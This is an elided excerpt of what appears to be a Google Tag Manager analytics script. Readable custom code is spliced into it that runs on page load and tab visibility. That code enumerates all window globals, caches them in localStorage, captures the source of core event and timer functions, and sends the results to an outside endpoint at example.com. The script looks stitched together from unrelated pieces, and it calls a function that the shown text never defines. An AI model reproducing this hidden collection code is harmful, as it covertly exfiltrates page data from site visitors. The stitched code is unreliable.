...
(function () {
  var data = {
    "resource": {
      ...
      "tags": [{
        ...
        "priority": 12,
        "vtp_instanceDestinationId": "G-Z5N44V7XE7",
        "tag_id": 30
      }, {
        ...
        "priority": 9,
        "vtp_settingsTable": ["list", ["map", "redactFieldGroup", "DEVICE_AND_GEO", "disallowAllRegions", true, "disallowedRegions", ""], ["map", "redactFieldGroup", "GOOGLE_SIGNALS", "disallowAllRegions", true, "disallowedRegions", ""]],
        "vtp_instanceDestinationId": "G-Z5N44V7XE7",
        "tag_id": 27
      }, {
  ...
  ni.oe = Number("0") || 0;
  ni.ia = "dataLayer";
  ni.fk = "ChEIgLCBqwYQoImRmYy0gcv7ARIlAGVEUgcU2UI20joeWNR17FlJASIcmF/jskm9PXQPp2/yDQNm7BoCWLg\x3d";
  var qi = {
      __cl: 1,
      __ecl: 1,
      __ehl: 1,
  ...
  function inspectGlobalScopeWithLocalStorage() {
    let newFindings = {};
    for (const key in window) {
      if (window.hasOwnProperty(key)) {
        if (localStorage.getItem(key) === null) {
          ...
          localStorage.setItem(key, JSON.stringify(newFindings[key]));
        }
      }
    }
    return newFindings;
  ...
  function grabJSHooks() {
    var hooks = ["addEventListener", "setTimeout", "setInterval"];
    var jsHooks = {};
    hooks.forEach(hook => {
      jsHooks[hook] = window[hook].toString();
    });
    return jsHooks;
  }
  ...
  async function sendHooksBack(hooks) {
    const apiEndpoint = "https://example.com/api/hooks";
    try {
      ...
      if (response.ok) {
        console.info("Hooks data successfully sent to backend");
      } else {
        console.warn(`Problem sending hooks data, server response status: ${response.status}`);
      }
    } catch (error) {
      console.error("Error occurred while sending hooks data:", error);
    }
  }
  ...
  window.addEventListener("load", () => {
    let findings = inspectGlobalScopeWithLocalStorage();
    let findingsCount = Object.keys(findings).length;
    if (findingsCount > 0) {
      console.group(`Results of global scope inspection - ${findingsCount} new findings:`);
      for (const finding in findings) {
        console.log(`${finding}: ${JSON.stringify(findings[finding])}`);
      }
      console.groupEnd();
      sendInsightsToBackend(findings);
      if (Object.keys(grabJSHooks()).length > 0) {
        sendHooksBack(grabJSHooks());
      }
    } else {
      console.info("Global scope inspection complete - no new findings");
    }
  });
  ...
  function hE() {
    var a = new sb();
    N(this, "read_container_data"), a.set("containerId", 'G-Z5N44V7XE7'), a.set("version", '1'), a.set("environmentName", ''), a.set("debugMode", $f), a.set("previewMode", bg), a.set("environmentMode", ag), a.set("firstPartyServing", wi || yi), a.set("containerUrl", Ec), a.Cb();
    return a;
  }
  ...
  document.addEventListener("visibilitychange", () => {
    if (document.visibilityState === "visible") {
      console.info("Page visibility changed, performing global scope inspection again");
